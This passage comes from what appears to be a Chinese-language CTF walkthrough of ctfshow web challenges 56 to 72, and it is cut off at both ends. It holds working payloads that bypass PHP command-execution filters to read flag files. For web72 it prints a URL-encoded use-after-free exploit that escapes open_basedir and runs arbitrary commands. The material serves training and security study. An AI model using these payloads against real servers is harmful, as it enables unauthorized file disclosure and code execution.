class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>利用一个简单的文本</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#!/bin/sh<br>cat flag.php<br></code></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="web57"><a class="markdownIt-Anchor" href="#web57"></a> web57</h2>
<p>利用linux语言的特性构造36</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure>
<h2 id="web58"><a class="markdownIt-Anchor" href="#web58"></a> web58</h2>
<h3 id="0x01-11"><a class="markdownIt-Anchor" href="#0x01-11"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readfile(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x02-11"><a class="markdownIt-Anchor" href="#0x02-11"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x03"><a class="markdownIt-Anchor" href="#0x03"></a> 0x03</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x04"><a class="markdownIt-Anchor" href="#0x04"></a> 0x04</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=copy(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x05"><a class="markdownIt-Anchor" href="#0x05"></a> 0x05</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x06"><a class="markdownIt-Anchor" href="#0x06"></a> 0x06</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x07"><a class="markdownIt-Anchor" href="#0x07"></a> 0x07</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(file(<span class="hljs-string">&quot;flag.php&quot;</span>));     <br></code></pre></td></tr></table></figure>
<h2 id="web59"><a class="markdownIt-Anchor" href="#web59"></a> web59</h2>
<p>基本同上可以找到</p>
<h2 id="web60"><a class="markdownIt-Anchor" href="#web60"></a> web60</h2>
<p>检测一下直接上，题目一样的，过滤了几个函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=copy(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web61"><a class="markdownIt-Anchor" href="#web61"></a> web61</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web62"><a class="markdownIt-Anchor" href="#web62"></a> web62</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web63"><a class="markdownIt-Anchor" href="#web63"></a> web63</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web64"><a class="markdownIt-Anchor" href="#web64"></a> web64</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web65"><a class="markdownIt-Anchor" href="#web65"></a> web65</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web66"><a class="markdownIt-Anchor" href="#web66"></a> web66</h2>
<h3 id="0x01-12"><a class="markdownIt-Anchor" href="#0x01-12"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<br>c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x02-12"><a class="markdownIt-Anchor" href="#0x02-12"></a> 0x02</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<br><br><br>c=%<span class="hljs-number">24</span>dir%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span><span class="hljs-built_in">DirectoryIterator</span>(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>dir%<span class="hljs-number">20</span><span class="hljs-keyword">as</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span><span class="hljs-keyword">echo</span>(%<span class="hljs-number">24</span>f.<span class="hljs-string">&#x27;%3Cbr%3E&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br><br><br>c=%<span class="hljs-number">24</span>exp%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span><span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aecho%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>exp%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure>
<p>一个奇巧的思路，利用php的原生类进行的读取都需要进行url编码</p>
<h2 id="web67"><a class="markdownIt-Anchor" href="#web67"></a> web67</h2>
<h3 id="0x01-13"><a class="markdownIt-Anchor" href="#0x01-13"></a> 0x01</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<br><br><br>c=%<span class="hljs-number">24</span>dir%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span><span class="hljs-built_in">DirectoryIterator</span>(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>dir%<span class="hljs-number">20</span><span class="hljs-keyword">as</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span><span class="hljs-keyword">echo</span>(%<span class="hljs-number">24</span>f.<span class="hljs-string">&#x27;%3Cbr%3E&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br><br><br>c=%<span class="hljs-number">24</span>exp%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span><span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aecho%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>exp%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure>
<h3 id="0x02-13"><a class="markdownIt-Anchor" href="#0x02-13"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<br>c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="web68"><a class="markdownIt-Anchor" href="#web68"></a> web68</h2>
<p>😋发现我这种解法好像官p还没有也是直接上原生</p>
<p>先进行<code>c=var_dump(scandir('/'));</code>或者用上面的原生类</p>
<h3 id="0x01-14"><a class="markdownIt-Anchor" href="#0x01-14"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=%24exp%20%3D%20new%20SplFileObject(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%3B%0Aecho%20%24exp%3B;<br></code></pre></td></tr></table></figure>
<h3 id="0x02-14"><a class="markdownIt-Anchor" href="#0x02-14"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x03-2"><a class="markdownIt-Anchor" href="#0x03-2"></a> 0x03</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>readgzfile函数在 PHP 中用于读取一个 GZIP 压缩的文件并直接输出其内容。</p>
<h2 id="web69"><a class="markdownIt-Anchor" href="#web69"></a> web69</h2>
<p>新的思路扫描目录</p>
<p><code>c=echo%20implode(&quot;,&quot;,(scandir('/')));</code></p>
<p>这段代码利用了 <code>scandir('/')</code> 函数来列出根目录的内容，然后用 <code>implode(&quot;,&quot;, ...)</code> 将数组连接为一个字符串，再通过 <code>echo</code> 输出。</p>
<h3 id="0x01-15"><a class="markdownIt-Anchor" href="#0x01-15"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
<h3 id="0x02-15"><a class="markdownIt-Anchor" href="#0x02-15"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>readgzfile函数在 PHP 中用于读取一个 GZIP 压缩的文件并直接输出其内容。</p>
<p>原生类用不来了，可能过长了</p>
<h2 id="web70"><a class="markdownIt-Anchor" href="#web70"></a> web70</h2>
<p>同69基本没变化</p>
<h2 id="web71"><a class="markdownIt-Anchor" href="#web71"></a> web71</h2>
<p>看一下源码关键内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>      <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>      <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br></code></pre></td></tr></table></figure>
<p>简单的来说就是缓冲区清理，防止直接暴露信息</p>
<h3 id="0x01-16"><a class="markdownIt-Anchor" href="#0x01-16"></a> 0x01</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-built_in">exit</span>();<br></code></pre></td></tr></table></figure>
<p>exit进行截断</p>
<h3 id="0x02-16"><a class="markdownIt-Anchor" href="#0x02-16"></a> 0x02</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<span class="hljs-built_in">exit</span>();<br></code></pre></td></tr></table></figure>
<p>当然也可以进行提前送出</p>
<h3 id="0x03-3"><a class="markdownIt-Anchor" href="#0x03-3"></a> 0x03</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);ob_flush();<br></code></pre></td></tr></table></figure>
<h2 id="web72"><a class="markdownIt-Anchor" href="#web72"></a> web72</h2>
<p>看源码也没什么思路，去看了下官p，思路还是要发散一下，这里也是利用了原生类进行读取找到flag所在的文件在哪里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure>
<p>讲一下大致的原理，首先利用?&gt;提前截取，然后利用原生类进行遍历读取文件，<code>glob:///*</code> 是一个流包装器（Stream Wrapper），它使用 <code>glob</code> 函数的模式来匹配根目录下的所有文件和文件夹。然后遍历读取，exit也是利用了提前截断。找到了flag在flag0.txt</p>
<p>利用了PHP中的一个<strong>Use-After-Free (UAF)漏洞</strong>来绕过<code>open_basedir</code>限制，从而执行任意命令（如读取<code>/flag0.txt</code>）。UAF漏洞利用了PHP的内存管理特性，尤其是对象在内存中的布局和其析构方式来操纵内存，从而获得代码执行能力，虽然看不懂但是用还是可以的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-keyword">function</span>%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B<span class="hljs-string">&#x27;args&#x27;</span>%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%2